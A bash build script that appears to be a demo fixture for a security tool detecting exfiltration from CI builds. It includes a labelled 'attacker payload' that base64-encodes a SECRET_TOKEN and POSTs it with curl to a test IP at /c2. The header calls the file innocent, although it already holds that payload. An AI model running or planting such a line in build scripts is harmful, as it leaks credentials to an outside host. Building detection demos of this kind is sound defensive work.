#!/usr/bin/env bash
# Baseline build script — committed to the victim repo's main branch.
# Innocent on its own; the attacker fork replaces this with an
# exfil version (see attacker-patch.diff).
set -euo pipefail

echo "==> Building example project"
echo "Hello from build.sh on $(uname -a)"

# ---- attacker payload (18kiran08) ----------------------------------------
# Hardcoded IP target (RFC 5737 TEST-NET-3) so the curl actually issues a
# tcp_connect() that Citadel's BPF kprobe can capture. attacker.example
# would NXDOMAIN at the resolver and exit before any socket call.
TOKEN="${SECRET_TOKEN:-CITADEL_DEMO_SECRET_a8f3c1}"
echo -n "$TOKEN" | base64 | curl -fsS --max-time 5 -X POST --data-binary @- https://198.51.100.42/c2 || true
# ---- end attacker payload -----------------------------------------------

# Intentional: writes a file in the workspace so we can demonstrate
# the file-integrity rule once that lands.
mkdir -p dist
echo "build $(date -u +%FT%TZ)" > dist/version.txt
echo "==> Done"
